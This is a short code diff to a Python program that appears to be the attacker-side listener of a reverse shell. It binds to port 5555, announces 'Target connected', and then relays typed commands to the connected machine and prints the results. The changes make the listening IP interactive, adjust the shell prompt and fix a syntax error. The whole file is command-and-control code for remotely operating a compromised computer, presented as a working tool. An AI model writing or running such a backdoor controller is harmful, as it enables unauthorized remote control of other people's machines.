@@ -17,7 +17,7 @@ def reliable_recv():
 
 def target_communication():
     while True:
-        command = input("* Shell~%s: " % str(ip))
+        command = input("* Shell~: ")
         reliable_send(command)
         if command == "quit":
             break
@@ -25,12 +25,13 @@ def target_communication():
             result = reliable_recv()
             cp(result, "blue")
 
+your_ip = input("Your IP:\n")
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(("192.168.178.132", 5555))
+sock.bind((your_ip, 5555))
 cp("[~] Listening for incomming connections:","yellow")
 
 sock.listen(5)
 target, ip = sock.accept()
-cp("[+] Target connected from: %s", % str(ip))
+cp("[+] Target connected from: %s" % str(ip))
 
 target_communication()
